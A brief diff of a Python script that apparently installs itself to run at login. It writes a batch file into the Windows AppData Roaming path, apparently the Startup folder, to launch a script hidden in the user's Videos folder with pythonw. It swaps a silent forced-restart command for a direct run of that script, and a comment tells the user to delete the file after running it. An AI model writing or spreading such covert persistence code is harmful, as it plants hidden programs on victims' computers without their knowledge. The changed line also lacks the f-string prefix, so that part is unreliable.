@@ -24,7 +24,7 @@ with open(f'C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows
     bat_file.write(f'pythonw "C:\\Users\\{getpass.getuser()}\\Videos\\file.py"')
 
 
-os.system('shutdown /r /t 300 /c " "')
+os.system('pythonw "C:\\Users\\{getpass.getuser()}\\Videos\\file.py"')
 os.system('start python fun.py')
 
 # delete this file after running it
